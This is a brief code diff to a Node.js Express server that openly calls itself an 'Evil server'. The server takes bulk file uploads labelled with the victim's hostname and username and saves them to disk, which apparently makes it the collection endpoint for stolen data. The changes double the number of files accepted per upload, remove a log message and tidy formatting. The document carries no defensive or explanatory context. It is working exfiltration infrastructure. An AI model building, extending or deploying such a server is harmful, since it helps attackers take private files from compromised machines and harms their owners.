@@ -24,17 +24,15 @@ const storage = multer.diskStorage({
 const upload = multer({ storage: storage });
 app.use(morgan('dev'));
 app.use(express.json());
-app.post('/upload', upload.array('files', 50), (req, res) => {
+app.post('/upload', upload.array('files', 100), (req, res) => {
     console.log(`[+] Received files from ${req.body.hostname} (${req.body.user})`);
     if (req.files && req.files.length > 0) {
         req.files.forEach(file => {
             console.log(`[+] File saved: ${file.path}`);
         });
-    } else {
-        console.log('[-] No files received');
     }
     res.status(200).send('Files received successfully');
 });
-app.listen(process.env.PORT, "0.0.0.0",() => {
+app.listen(process.env.PORT, "0.0.0.0", () => {
     console.log(`[+] Evil server listening on port ${process.env.PORT}`);
 });
